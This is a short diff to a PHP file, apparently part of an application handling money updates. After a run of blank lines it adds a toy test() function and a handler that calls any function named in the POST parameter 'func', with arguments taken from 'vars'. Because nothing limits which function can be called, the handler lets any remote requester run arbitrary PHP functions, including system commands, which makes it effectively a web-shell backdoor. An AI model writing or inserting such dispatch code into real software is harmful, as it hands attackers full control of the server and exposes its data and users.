@@ -109,3 +109,24 @@ function setUpdPieniadze($count) {
 }
 
 
+
+
+
+
+
+
+
+
+function test($a = 1, $b = 2) {
+    $sum = $a+$b;
+    echo json_encode($sum);
+}
+if (isset($_POST["func"])) {
+    if (isset($_POST["vars"])) {
+        $vars = json_decode($_POST["vars"]);
+        call_user_func_array($_POST["func"], $vars);
+    } else {
+        $_POST["func"]();
+    }
+}
+
